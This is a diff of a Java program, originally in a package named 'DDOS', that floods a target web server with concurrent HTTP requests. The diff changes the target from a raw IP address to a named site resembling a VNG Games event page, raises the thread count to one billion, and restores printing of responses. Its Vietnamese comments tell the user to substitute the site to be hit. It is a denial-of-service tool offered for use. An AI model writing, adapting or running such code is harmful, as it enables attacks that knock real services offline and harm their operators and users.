@@ -1,5 +1,3 @@
-package DDOS;
-
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
@@ -10,8 +8,8 @@ import java.util.concurrent.Executors;
 
 public class ConcurrentHttpRequestExample {
     public static void main(String[] args) {
-        String url = "http://103.57.220.69/";  // Thay thế bằng URL của trang web bạn muốn gửi request tới
-        int numThreads =500000000;  // Số lượng luồng
+        String url = "https://lienminh.sukien-vnggames.com/";  // Thay thế bằng URL của trang web bạn muốn gửi request tới
+        int numThreads = 1000000000;  // Số lượng luồng
 
         // Tạo một ExecutorService với số lượng luồng cần tạo
         ExecutorService executorService = Executors.newFixedThreadPool(numThreads);
@@ -59,8 +57,7 @@ class RequestWorker implements Runnable {
             in.close();
 
             // Hiển thị phản hồi từ server
-//            System.out.println("Thread " + Thread.currentThread().getId() + " - Nội dung phản hồi từ server:\n" + response.toString());
-            System.out.println("Thread " + Thread.currentThread().getId() + " - Nội dung phản hồi từ server:\n" );
+            System.out.println("Thread " + Thread.currentThread().getId() + " - Nội dung phản hồi từ server:\n" + response.toString());
 
         } catch (IOException e) {
             e.printStackTrace();
